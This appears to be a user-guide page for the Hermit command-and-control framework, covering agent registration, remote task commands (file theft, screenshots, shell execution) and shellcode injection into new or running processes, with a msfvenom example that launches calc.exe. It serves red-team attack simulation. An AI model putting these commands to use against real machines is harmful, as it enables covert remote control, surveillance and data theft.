+++
title = "Agent"
date = 2024-01-11
[extra]
toc=true
+++

After executing the implant in target computer, the agent will start and attempt to connect to your C2 server's listener.  
If it succeeds, the agent has been registered in the C2 server. You can check agents with the `agents` (or `agent list`) command.

```sh
Hermit $ agents
```

## Switch to Agent Mode

To interact with the agent for attack simulation, you can run the `agent use <ID or Name>` command.

```sh
# Specify the agent ID
Hermit $ agent use 1

# Specify the agent name
Hermit $ agent use agent_123
```

<br />

## Send Tasks

In the agent mode, you can remote control to target computer with sending tasks to the agent.  
Specifically, you can use the following commands:

|Command|Description|
|---|---|
|exit|Exit the agent mode.|
|cat|Read a file content.|
|cd|Change the current directory.|
|cp|Copy file to another location.|
|download|Download a file from target computer.|
|info|Get the detailed information of the system.|
|ls|List files in specified directory.|
|loot|Show the looted information for the agent that you've obtained so far. (Under development)|
|mkdir|Create a new directory.|
|net|Get the network information.|
|ps|Process management.|
|pwd|Get the current directory.|
|rm|Remove file or directory.|
|screenshot|Take a screenshot for target machine.|
|shell|Execute shell command for target machine.|
|shellcode|Inject a shellcode for executing arbitrary commands in the new created process.|
|sleep|Change sleep time for sending requests to C2 server.|
|upload|Upload a file to target computer.|
|whoami|Get current username.|
|help|Print this message or the help of the given subcommand(s)|

### Shell

- CMD

```sh
Hermit [agent: agent_2352650890] $ shell whoami
[+] VICTIM\john
```

- PowerShell

If you want to run PowerShell command, add the `--ps` flag.

```sh
Hermit [agent: agent_2352650890] $ shell --ps Get-Process
[+]
...
```

### Shellcode

To execute shellcode in process, you need to generate shellcode at first.  
For example, the following command generates a shellcode which opens `calc.exe`.  
Currently **HEX** encoding required.

```sh
msfvenom -p windows/x64/exec CMD="calc.exe" -f hex -o /tmp/shellcode.txt
```

After generating, run the `shellcode` command in the agent mode.

- **Inject New Process**

When specifying the process name with the `--process` option, a new process will be created and injected shellcode.

```sh
Hermit [agent: agent_2352650890] $ shellcode --process svchost --file /tmp/shellcode.txt
```

- **Inject Running Process**

When specifying the process ID with the `--pid` option, the currently running process will be injected shellcode.  
To list the PIDs, run the `ps list` command in agent mode.

```sh
Hermit [agent: agent_2352650890] $ shellcode --pid 1234 --file /tmp/shellcode.txt
```

If successful, the target computer opens `calc.exe`.

<br />

## Quit Agent Mode

To quit the agent mode and return the home console, run the `exit` command.

```sh
Hermit [agetn: agent_0123] $ exit
```

<br />

## Delete Agent

```sh
# Specify the agent ID
Hermit $ agent delete 1

# Specify the agent name
Hermit $ agent delete agent_123
```

### Delete All Agents

If you want to delete all agents, specify `all` to the second argument as below:

```sh
Hermit $ agent delete all
```
